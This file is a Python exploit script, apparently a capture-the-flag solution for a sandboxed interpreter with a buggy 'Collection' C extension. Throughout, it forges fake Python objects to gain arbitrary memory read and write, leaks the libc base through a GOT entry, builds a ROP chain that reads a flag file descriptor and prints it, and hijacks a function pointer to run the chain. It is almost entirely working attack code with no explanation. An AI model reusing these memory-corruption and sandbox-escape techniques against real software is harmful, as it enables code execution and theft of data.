from sys import modules
del modules['os']
import Collection
keys = list(__builtins__.__dict__.keys())
for k in keys:
    if k != 'id' and k != 'hex' and k != 'print' and k != 'range':
        del __builtins__.__dict__[k]

def p64(x):
    return x.to_bytes(8, 'little')

def u64(x):
    x = x[::-1]
    res = 0
    for i in range(0,8):
        res =  x[i] + (res << 8 )
    return res

def fake(addr):
    fake_bytearray  = p64(0xff)
    fake_bytearray += p64(0x9ce7e0)
    fake_bytearray += p64(0x8)
    fake_bytearray += p64(0x9)
    fake_bytearray += p64(addr)
    fake_bytearray += p64(addr)
    fake_bytearray += p64(0)
    
    fake_list_ob_item = p64(id(fake_bytearray)+0x20)
    fake_list  = p64(0xff)
    fake_list += p64(0x9c8a80)
    fake_list += p64(1)
    fake_list += p64(id(fake_list_ob_item)+0x20)
    fake_list += p64(1)
    
    x = Collection.Collection({'a':1, 'b':[1]})
    y = Collection.Collection({'b':[1], 'a':id(fake_list)+0x20})
    
    l = y.get('b')[0]
    return l

def r64(addr):
    l = fake(addr)
    return u64(l)

def w64(addr, data):
    l = fake(addr)
    for i in range(8):
        l[i] = p64(data)[i]

memcpy_got = 0x9b3dc0
libc_base = r64(memcpy_got) - 0xbb520
print('[*] libc base: ' + hex(libc_base))

flag = b'*'*0x100

fake_iovec  = p64(id(flag)+0x20)
fake_iovec += p64(0x100)

rop  = p64(libc_base + 0x2155f) # pop rdi
rop += p64(1023)
rop += p64(libc_base + 0x1306D9) # pop rdx; pop rsi; ret
rop += p64(1)
rop += p64(id(fake_iovec)+0x20)
rop += p64(libc_base + 0x116600)
rop += p64(libc_base + 0x2155f) # pop rdi
rop += p64(1)
rop += p64(libc_base + 0x1306D9) # pop rdx; pop rsi; ret
rop += p64(0x40)
rop += p64(id(flag)+0x20)
rop += p64(libc_base + 0x110140)
rop += p64(0xdeadbeaf)

pivot  = p64(id(rop) + 0x20)
pivot += p64(libc_base + 0x520EF) # ret

x = Collection.Collection({'a':id(pivot)-0xa0+0x20})
collect_base = id(x) - 0x430e68  - 0x25000# 0x7ffff6423000
print('[*] collect base: ' + hex(collect_base))

w64(collect_base + 0x204040, libc_base + 0x520a5) # PyLong_FromLong
print('b *'+hex(libc_base+0x520a5))

x.get('a')
